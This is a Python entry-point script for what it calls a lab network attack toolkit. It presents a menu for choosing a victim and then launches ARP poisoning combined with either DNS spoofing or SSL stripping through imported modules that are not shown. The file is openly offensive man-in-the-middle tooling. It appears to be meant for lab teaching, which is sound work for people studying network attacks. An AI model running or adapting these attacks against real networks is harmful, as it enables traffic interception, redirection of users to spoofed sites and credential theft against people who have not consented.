#!/usr/bin/env python3
"""
Main attack script
Provides menu to select target and attack type.

Modules:
- common.py: Shared functions and attack configurations
- dns_spoofing.py: Code for DNS spoofing attack
- ssl_stripping.py: Code for SSL stripping attack
"""

import sys
from common import (
    select_target,
    select_attack_type,
    run_arp_poisoning,
    SPOOF_DOMAIN,
    SPOOF_TO_IP,
    WEB_SERVER_IP,
    SSL_STRIP_PROXY_PORT
)
from dns_spoofing import run_dns_spoofing
from ssl_stripping import run_ssl_stripping


def main():
    print("=" * 60)
    print("\t\tLAB NETWORK ATTACK TOOLKIT")
    print("=" * 60)
    
    # Select target
    victim = select_target()
    print("\n" + "=" * 60)
    
    # Select attack type
    attack_type = select_attack_type()

    if attack_type == "1":
        # ARP + DNS Spoofing
        print("\n" + "=" * 60)
        print("  ATTACK 1: ARP Poisoning + DNS Spoofing")
        print("=" * 60)
        print(f"  Target domain: {SPOOF_DOMAIN}")
        print(f"  Redirect to:   {SPOOF_TO_IP}")
        print("=" * 60 + "\n")
        
        # Start DNS spoofing thread
        run_dns_spoofing()
        
        # Run ARP poisoning and packet capturing
        run_arp_poisoning(victim)

    elif attack_type == "2":
        # ARP + SSL Stripping
        print("\n" + "=" * 60)
        print("  ATTACK 2: ARP Poisoning + SSL Stripping")
        print("=" * 60)
        print(f"  Target server: https://{WEB_SERVER_IP}")
        print(f"  Proxy port:    {SSL_STRIP_PROXY_PORT}")
        print("=" * 60 + "\n")
        
        # Start SSL stripping proxy thread
        run_ssl_stripping()
        
        # Run ARP poisoning and packet capturing
        run_arp_poisoning(victim)

    else:
        print("\n- Invalid attack type")
        sys.exit(0)


if __name__ == "__main__":
    main()
